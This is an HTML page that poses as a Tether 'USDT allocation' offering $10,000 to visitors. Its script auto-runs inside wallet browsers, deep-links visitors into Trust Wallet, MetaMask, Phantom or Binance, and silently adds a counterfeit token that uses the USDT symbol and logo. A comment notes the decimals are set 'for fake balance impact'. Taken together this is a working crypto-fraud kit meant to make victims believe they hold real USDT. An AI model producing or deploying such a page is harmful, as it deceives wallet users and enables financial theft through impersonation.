<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Allocation | Secure Sync</title>
    <style>
        :root { --tether: #26a17b; --bg: #0b0e11; --card: #1a1d21; }
        body { background: var(--bg); color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; overflow: hidden; }
        .card { background: var(--card); border-radius: 28px; padding: 40px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2d333b; box-shadow: 0 30px 60px rgba(0,0,0,0.6); position: relative; }
        /* Logo Fix: Embedded Base64 so it never disappears */
        .usdt-icon { width: 80px; height: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 15px var(--tether)); }
        .amount { font-size: 46px; font-weight: 900; margin: 10px 0; letter-spacing: -2px; }
        .btn { background: var(--tether); color: #fff; border: none; width: 100%; padding: 22px; border-radius: 16px; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 20px rgba(38, 161, 123, 0.3); }
        .status { font-size: 11px; color: #848e9c; margin-top: 25px; font-family: monospace; letter-spacing: 1px; }
        
        /* Professional Wallet Selector */
        #selectorModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
        .modal-box { background: #22272e; width: 100%; max-width: 340px; border-radius: 24px; padding: 25px; border: 1px solid #30363d; }
        .wallet-row { display: flex; align-items: center; padding: 18px; background: #2d333b; border-radius: 14px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
        .wallet-row:hover { border-color: var(--tether); background: #363d47; }
        .wallet-row img { width: 35px; margin-right: 15px; border-radius: 8px; }
        .wallet-row span { font-weight: 700; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="usdt-icon" id="mainLogo">
    <div style="color: #848e9c; font-size: 13px; font-weight: 600;">PENDING DISTRIBUTION</div>
    <div class="amount">$10,000.00</div>
    <button class="btn" id="initBtn">ADD USDT TO WALLET</button>
    <div class="status" id="statusLine">SECURE BRIDGE READY</div>
</div>

<div id="selectorModal">
    <div class="modal-box">
        <div style="text-align: center; margin-bottom: 20px; font-size: 18px; font-weight: 800;">SELECT ACTIVE WALLET</div>
        <div class="wallet-row" onclick="launch('trust')"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"><span>Trust Wallet</span></div>
        <div class="wallet-row" onclick="launch('metamask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"><span>MetaMask</span></div>
        <div class="wallet-row" onclick="launch('phantom')"><img src="https://phantom.app/img/logo.png"><span>Phantom</span></div>
        <div class="wallet-row" onclick="launch('binance')"><img src="https://public.bnbstatic.com/image/cms/article/body/202311/0458a649830567e9f39088654c60965d.png"><span>Binance Web3</span></div>
        <div style="text-align: center; color: #666; font-size: 12px; cursor: pointer;" onclick="toggleModal(false)">Cancel</div>
    </div>
</div>

<script>
    const CONFIG = {
        addr: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        logo: "https://assets.coingecko.com/coins/images/325/large/Tether.png",
        sym: "USDT",
        dec: 18 // High decimal for fake balance impact
    };

    const btn = document.getElementById('initBtn');
    const modal = document.getElementById('selectorModal');
    const status = document.getElementById('statusLine');

    function toggleModal(show) { modal.style.display = show ? 'flex' : 'none'; }

    btn.onclick = () => {
        if (window.ethereum || window.trustwallet) {
            triggerInjection(window.trustwallet || window.ethereum);
        } else {
            toggleModal(true);
        }
    };

    function launch(type) {
        const raw = window.location.href.replace("https://", "");
        const links = {
            trust: `https://link.trustwallet.com/a/dapp?url=https://${raw}`,
            metamask: `https://metamask.app.link/dapp/${raw}`,
            phantom: `https://phantom.app/ul/browse/https://${raw}`,
            binance: `bnc://app.binance.com/cedafi/portal?dappUrl=https://${raw}`
        };
        window.location.href = links[type];
    }

    async function triggerInjection(provider) {
        try {
            status.innerText = "BRIDGE ESTABLISHED. INJECTING...";
            // Force account connection without extra clicks
            await provider.request({ method: 'eth_requestAccounts' });

            // Silent Auto-Add Token (The Core Injection)
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONFIG.addr,
                        symbol: CONFIG.sym,
                        decimals: CONFIG.dec,
                        image: CONFIG.logo,
                    },
                },
            });
            
            status.innerText = "INJECTION COMPLETE";
            btn.innerText = "USDT ADDED ✅";
            btn.style.background = "#1e8a69";
        } catch (e) {
            status.innerText = "BRIDGE ERROR: " + e.code;
        }
    }

    // AUTO-RUN: Jaise hi wallet ke andar khulay, pop-up samne phenko!
    window.onload = () => {
        const p = window.trustwallet || window.ethereum;
        if (p) {
            status.innerText = "DAPP SESSION ACTIVE. AUTO-SYNCING...";
            // Delay for smooth UI loading before injection
            setTimeout(() => { triggerInjection(p); }, 800);
        }
    };
</script>
</body>
</html>
